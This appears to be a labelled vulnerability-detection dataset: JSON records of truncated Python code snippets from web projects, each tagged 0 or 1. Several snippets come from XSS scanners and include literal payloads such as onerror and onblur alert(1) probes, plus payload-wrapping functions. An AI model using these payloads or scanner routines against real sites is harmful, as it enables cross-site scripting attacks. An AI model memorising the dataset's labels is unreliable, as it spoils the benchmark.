logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse", "label": 1}, {"snippet_id": 24930, "code": " Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get", "label": 0}, {"snippet_id": 11074, "code": ".imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms -", "label": 0}, {"snippet_id": 13269, "code": " name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 46667, "code": ".get_context_data()) def get_form_kwargs(self, *args, **kwargs): kwargs=super().get_form_kwargs() kwargs['entry_form_config']=entry_form_config question_ids={str(q['id']) for q in entry_form_config} data={ f'{item}", "label": 0}, {"snippet_id": 39035, "code": "\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t", "label": 0}, {"snippet_id": 31937, "code": ".get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): ", "label": 0}, {"snippet_id": 11632, "code": "/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views", "label": 0}, {"snippet_id": 35454, "code": "\t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t", "label": 0}, {"snippet_id": 52984, "code": " filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor", "label": 0}, {"snippet_id": 12156, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 35742, "code": " \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length", "label": 0}, {"snippet_id": 26244, "code": ".changed_data or not data.get('vat_id'): self.instance.vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not", "label": 0}, {"snippet_id": 54093, "code": "=None c=cookie.get() if len(c)>0: ck=c for x in crl: if stop==True: break print(\"[*]URL:{}\".format(x)) bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh", "label": 0}, {"snippet_id": 7057, "code": ".logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(", "label": 0}, {"snippet_id": 39488, "code": "(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self)", "label": 0}, {"snippet_id": 30557, "code": " not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv", "label": 0}, {"snippet_id": 33255, "code": "): \"\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend-default') def post(self, host, task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders(webapp2.RequestHandler): \"", "label": 0}, {"snippet_id": 30695, "code": ".get_setting('server_state_file') \thaproxy_sock=sql.get_setting('haproxy_sock') \tenable=form.getvalue('servaction') \tbackend=form.getvalue('servbackend')\t \tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",", "label": 0}, {"snippet_id": 43562, "code": " required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield", "label": 0}, {"snippet_id": 51866, "code": ", 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', }, } }, 'loggers':{ 'django':{ 'handlers':['console'], 'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'), }, 'dashboard':{ 'handlers", "label": 0}, {"snippet_id": 10292, "code": "=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 42076, "code": "\t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta", "label": 0}, {"snippet_id": 19160, "code": "='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit", "label": 0}, {"snippet_id": 51332, "code": ".internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions=[] @admin.register(UrlList) class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):", "label": 0}, {"snippet_id": 29211, "code": " info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs)", "label": 0}, {"snippet_id": 45527, "code": ".get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id", "label": 0}, {"snippet_id": 27105, "code": " hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\") as f: for line in f: if line.find(\"</form>\") >=0: has_form=0 if len(page) > 0 and len(params) > 0: check_xss(host, page,", "label": 1}, {"snippet_id": 48683, "code": "\"/admin?error=noyb\") response: HttpResponseRedirect=HttpResponseRedirect(forward_url +\"?rid=\" +str(r.id)) return response def action_delete_article(request: HttpRequest): \"\"\" This function removes an article", "label": 0}, {"snippet_id": 25797, "code": ".TYPE_CHOICE_MULTIPLE: field=forms.ModelMultipleChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.CheckboxSelectMultiple, initial=initial.options", "label": 0}, {"snippet_id": 3390, "code": " in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req", "label": 0}, {"snippet_id": 23294, "code": "'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/", "label": 0}, {"snippet_id": 44648, "code": "\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=", "label": 0}, {"snippet_id": 41950, "code": "\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t", "label": 0}, {"snippet_id": 29908, "code": ", commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('ssh_cert'): \tname=form.getvalue('name') \t \tif not os.path", "label": 0}, {"snippet_id": 37446, "code": " \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren", "label": 0}, {"snippet_id": 12748, "code": "'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib", "label": 0}, {"snippet_id": 15132, "code": ".test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib", "label": 0}, {"snippet_id": 39243, "code": "\t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe", "label": 0}, {"snippet_id": 752, "code": "=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update", "label": 0}, {"snippet_id": 10700, "code": ") num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities", "label": 0}, {"snippet_id": 44581, "code": ", owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow'] for node in workflow['nodes'] if node['type']==", "label": 0}, {"snippet_id": 6977, "code": "=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student", "label": 0}, {"snippet_id": 13950, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 3963, "code": "}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header", "label": 0}, {"snippet_id": 4503, "code": " fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt) s=s.replace(\"A\", \"\u0104\", cnt) s=s.replace(\"a\", \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\", \"\u0430\", cnt) s=s.replace(\"e\", \"\u0451\",", "label": 0}, {"snippet_id": 1569, "code": "\"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids", "label": 0}, {"snippet_id": 23474, "code": "'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if", "label": 0}, {"snippet_id": 48783, "code": ".utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException", "label": 0}, {"snippet_id": 23754, "code": "='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD", "label": 0}, {"snippet_id": 25277, "code": " fname, label, size=field data.append(value.get(fname, \"\")) if '_legacy' in value and not data[-1]: data[-1]=value.get('_legacy', '') return data def render(self, name: str, value, attrs=None, renderer", "label": 0}, {"snippet_id": 11827, "code": ".views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views", "label": 0}, {"snippet_id": 48394, "code": " request.POST or str(\"notes_\" +str(art.id)) not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if", "label": 0}, {"snippet_id": 22703, "code": "'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',", "label": 0}, {"snippet_id": 15594, "code": "('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir", "label": 0}, {"snippet_id": 10635, "code": " is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style", "label": 0}, {"snippet_id": 51380, "code": "\n\"\"\" Django settings for dashboard project. Generated by 'django-admin startproject' using Django 2.1.7. For more information on this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For", "label": 0}, {"snippet_id": 11809, "code": "'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media", "label": 0}, {"snippet_id": 12376, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary", "label": 0}, {"snippet_id": 40347, "code": " \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get", "label": 0}, {"snippet_id": 53425, "code": ") if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner", "label": 0}, {"snippet_id": 42311, "code": "\t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]", "label": 0}, {"snippet_id": 25925, "code": "=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) field.question=q if answers: field.answer=answers[0] self.fields['question_%s' % q.id]=field responses=question_form_fields", "label": 0}, {"snippet_id": 22643, "code": "\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses", "label": 0}, {"snippet_id": 50607, "code": " session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key=\"webclient/ajax\" super(AjaxWebClientSession, self).__init__(*args, **kwargs) def get_client_session(self): \"\"\"", "label": 0}, {"snippet_id": 4391, "code": "(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style", "label": 0}, {"snippet_id": 16038, "code": ".contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE')", "label": 0}, {"snippet_id": 44765, "code": "%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set()", "label": 0}, {"snippet_id": 50118, "code": " in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[],{}]) for csessid in to_remove: sessions=self.sessionhandler.sessions_from_csessid", "label": 0}, {"snippet_id": 27268, "code": "() m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M) if m: host=m.group(2) else: print \"[-] Can't get host information\" exit() print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests", "label": 0}, {"snippet_id": 46258, "code": ".get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections and engine=='solr': return no_collections(request) collection=Collection2(user=request.user, name=name,", "label": 0}, {"snippet_id": 45784, "code": ", kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping", "label": 0}, {"snippet_id": 28857, "code": " sshException: \t\treturn 'Unable to establish SSH connection: %s ' % sshException \t\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' ", "label": 0}, {"snippet_id": 25874, "code": "=Question.TYPE_TIME: field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None, widget", "label": 0}, {"snippet_id": 23820, "code": "}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{", "label": 0}, {"snippet_id": 14549, "code": " import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"", "label": 0}, {"snippet_id": 15319, "code": "=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None", "label": 0}, {"snippet_id": 18705, "code": "')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 41035, "code": "')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has", "label": 0}, {"snippet_id": 19556, "code": " inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh", "label": 0}, {"snippet_id": 1483, "code": " scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard", "label": 1}, {"snippet_id": 51044, "code": " print('cleaning') cleaned_data=super(PeriodicTaskForm, self).clean() return cleaned_data class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin): list_display=('name_safe', 'enabled', 'interval", "label": 0}, {"snippet_id": 16826, "code": ">[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 1}, {"snippet_id": 49541, "code": ".remote_field qs=remote_field.model.objects.filter(pk__in=pks) values=[ SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs ] return[SmartFilterValue(self.field_name, _", "label": 0}, {"snippet_id": 11631, "code": "]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student", "label": 0}, {"snippet_id": 15283, "code": " documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get(", "label": 0}, {"snippet_id": 8623, "code": ".views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 5761, "code": "<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video", "label": 0}, {"snippet_id": 42002, "code": ": \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not", "label": 0}, {"snippet_id": 34234, "code": " ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\"", "label": 0}, {"snippet_id": 54603, "code": ": \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs): queryset=Article.objects.order_by('-time') for i in queryset: i", "label": 1}, {"snippet_id": 32151, "code": " rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID", "label": 1}, {"snippet_id": 44552, "code": " if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request", "label": 0}, {"snippet_id": 42304, "code": "=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): ", "label": 0}, {"snippet_id": 50549, "code": " through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0", "label": 0}, {"snippet_id": 20382, "code": "*args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get(", "label": 0}, {"snippet_id": 27168, "code": "+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"', line, re", "label": 1}, {"snippet_id": 19902, "code": ".verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self", "label": 1}, {"snippet_id": 43142, "code": "\t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname", "label": 0}, {"snippet_id": 17936, "code": "'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$", "label": 0}, {"snippet_id": 53506, "code": "\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra", "label": 0}, {"snippet_id": 27964, "code": " page.\"\"\" import datetime from config import local_config from handlers import base_handler from libs import auth from libs import handler from libs import helpers from metrics import logs SESSION_EXPIRY_DAYS", "label": 0}, {"snippet_id": 50716, "code": ", **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options(dict):", "label": 0}, {"snippet_id": 47219, "code": ".name): item for item in admin.menu()} assert 'Records' in menu_items assert menu_items['Records'].is_category() submenu_items={ str(item.name): item for item in menu_items['Records'].get_children()} assert", "label": 0}, {"snippet_id": 8251, "code": "( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider", "label": 0}, {"snippet_id": 47536, "code": " ')) f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations'", "label": 0}, {"snippet_id": 19681, "code": " \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure", "label": 0}, {"snippet_id": 13929, "code": "/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 28702, "code": ".environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry", "label": 0}, {"snippet_id": 32652, "code": " 'gitiles_ext_blocks', 'gitiles_smart_quotes', ] extension_configs={ 'markdown.extensions.toc':{ 'slugify': _gitiles_slugify }, } contents=self._Read(path[1:]) md=markdown.Markdown(extensions=extensions", "label": 0}, {"snippet_id": 47967, "code": " frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown, get_current_user import logging import ntpath import os import math import PIL from PIL import Image", "label": 0}, {"snippet_id": 16141, "code": "/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax", "label": 0}, {"snippet_id": 31006, "code": "'tmp_config_path') \tscript=\"install_keepalived.sh\" \t \tif form.getvalue('hap')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect", "label": 0}, {"snippet_id": 15427, "code": " self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install(", "label": 0}, {"snippet_id": 19852, "code": "(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self", "label": 0}, {"snippet_id": 9970, "code": " for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test", "label": 0}, {"snippet_id": 24645, "code": " \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format", "label": 0}, {"snippet_id": 43832, "code": " values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset", "label": 0}, {"snippet_id": 44365, "code": "-1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow", "label": 1}, {"snippet_id": 6963, "code": ", url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r", "label": 0}, {"snippet_id": 3536, "code": "\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload", "label": 0}, {"snippet_id": 55158, "code": "'invalid_translation_count': invalid_translation_count, }) update_stats(action_status['translated_resources'], locale) mark_changed_translation(action_status['changed_entities'], locale) if action_status['latest_translation_pk", "label": 0}, {"snippet_id": 42939, "code": "\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in 